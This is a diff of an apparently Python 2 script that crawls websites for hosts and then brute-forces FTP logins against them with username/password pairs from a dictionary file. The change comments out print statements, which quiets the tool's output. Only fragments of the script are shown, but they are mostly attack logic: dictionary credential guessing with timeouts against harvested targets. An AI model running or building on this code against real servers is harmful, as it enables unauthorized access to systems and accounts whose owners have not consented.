@@ -23,11 +23,11 @@ def bruteLogin(dic):
             gevent.sleep(0)
             continue
         hostname=hosts.get()
-        print hostname
+        #print hostname
         
         for userName in dic.keys():
             passWord=dic[userName]
-            print "[+] Trying: "+userName+"/"+passWord
+            #print "[+] Trying: "+userName+"/"+passWord
             try:
                 with gevent.Timeout(2, False) as timeout:
                     ftp = ftplib.FTP(hostname)
@@ -39,7 +39,7 @@ def bruteLogin(dic):
                     ftp.quit()
             except Exception, e:
                 pass
-            print 'login {0} wrong.'.format(hostname)
+            #print 'login {0} wrong.'.format(hostname)
 
         
 def scanhost():
@@ -48,7 +48,7 @@ def scanhost():
             print 'no host'
         host=hostpool.get()
         #connect to a URL
-        print host
+        #print host
         try:
             with gevent.Timeout(10, False) as timeout:
                 website = urllib2.urlopen(host)
@@ -70,7 +70,8 @@ def scanhost():
                         hosts.put(ip)
                         hostset.add(link[2])
         except Exception,e:
-            print 'urlopen:'+host+str(e)
+            #print 'urlopen:'+host+str(e)
+            pass
 
 
 pF = open(passwdFile, 'r')
